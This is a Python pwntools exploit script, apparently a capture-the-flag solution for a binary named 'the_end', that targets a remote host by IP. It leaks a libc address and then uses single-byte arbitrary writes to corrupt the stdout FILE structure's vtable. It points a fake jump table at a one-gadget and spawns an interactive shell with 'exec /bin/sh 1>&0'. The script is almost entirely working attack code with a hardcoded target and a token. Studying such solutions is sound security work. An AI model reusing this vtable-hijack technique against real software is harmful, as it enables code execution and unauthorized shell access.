from pwn import *


DEBUG = 1
if DEBUG:
     p = process('./the_end')
     e = ELF('./the_end')
     #scontext.log_level = 'debug'
     #libc=ELF('/lib/i386-linux-gnu/libc-2.23.so')b0verfl0w
     #libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
     #p = process(['./reader'], env={'LD_PRELOAD': os.path.join(os.getcwd(),'libc-2.19.so')})
     libc = ELF('./libc64.so')
     
else:
     p = remote('150.109.46.159', 20002)
     libc = ELF('./libc64.so')
     #libc = ELF('libc_64.so.6')



wordSz = 4
hwordSz = 2
bits = 32
PIE = 0
mypid=0
def leak(address, size):
   with open('/proc/%s/mem' % mypid) as mem:
      mem.seek(address)
      return mem.read(size)

def findModuleBase(pid, mem):
   name = os.readlink('/proc/%s/exe' % pid)
   with open('/proc/%s/maps' % pid) as maps:
      for line in maps:
         if name in line:
            addr = int(line.split('-')[0], 16)
            mem.seek(addr)
            if mem.read(4) == "\x7fELF":
               bitFormat = u8(leak(addr + 4, 1))
               if bitFormat == 2:
                  global wordSz
                  global hwordSz
                  global bits
                  wordSz = 8
                  hwordSz = 4
                  bits = 64
               return addr
   log.failure("Module's base address not found.")
   sys.exit(1)

def debug(addr):
    global mypid
    mypid = proc.pidof(p)[0]
    #raw_input('debug:')
    
    with open('/proc/%s/mem' % mypid) as mem:
        moduleBase = findModuleBase(mypid, mem)
        print "program_base",hex(moduleBase)
        gdb.attach(p, "set follow-fork-mode parent\nb *" + hex(moduleBase+addr))

def write_value(addr,value):
    p.send(p64(addr))
    p.send(p8(value))
def pwn():
    #debug(0x964)
    #p.recvuntil('token:')
    #p.sendline('6ywP1UFC9MJMgU7LdgSZcqXyvkws1fFY')
    p.recvuntil('gift ')
    sleep_addr=int(p.recv(14),16)
    print "sleep_addr",hex(sleep_addr)
    
    libc_base=sleep_addr-libc.symbols['sleep']
    rce=0xf02a4+libc_base
    
    print "rce",hex(rce)
    
    #stderr=libc_base+libc.symbols['_IO_file_jumps']
    
    #for i in range(0,5):
        #p.send(p64(libc_base+libc.symbols['__malloc_hook']))
        #p.send(p8(0))
    
    addr1=libc_base+libc.symbols['_IO_2_1_stdout_']+5*8
    value1=0xff
    write_value(addr1,value1)

    addr2=libc_base+libc.symbols['_IO_2_1_stdout_']+0xd8+1
    value2=((libc_base+libc.symbols['_IO_file_jumps']+0xe00)>>8)&0xff
    write_value(addr2,value2)
    #print hex(addr2),hex(value2)
    
    addr3=libc_base+libc.symbols['_IO_file_jumps']+0xe00+3*8
    value3=rce&0xff
    write_value(addr3,value3)
    #print hex(addr3)
    addr4=libc_base+libc.symbols['_IO_file_jumps']+0xe00+3*8+1
    value4=(rce>>8)&0xff
    write_value(addr4,value4)

    addr5=libc_base+libc.symbols['_IO_file_jumps']+0xe00+3*8+2
    value5=(rce>>16)&0xff
    write_value(addr5,value5)
    
    #print *(struct _IO_FILE_plus *) 0x000055a20796d030
    
    
    #p.sendline('cat flag 1>&0')
    p.sendline('exec /bin/sh 1>&0')
    p.interactive()
#_IO_cleanup+260
#print *(struct _IO_jump_t *) 0x7f8ead1100e0
#0x8a34277900
if __name__ == '__main__':
   pwn()

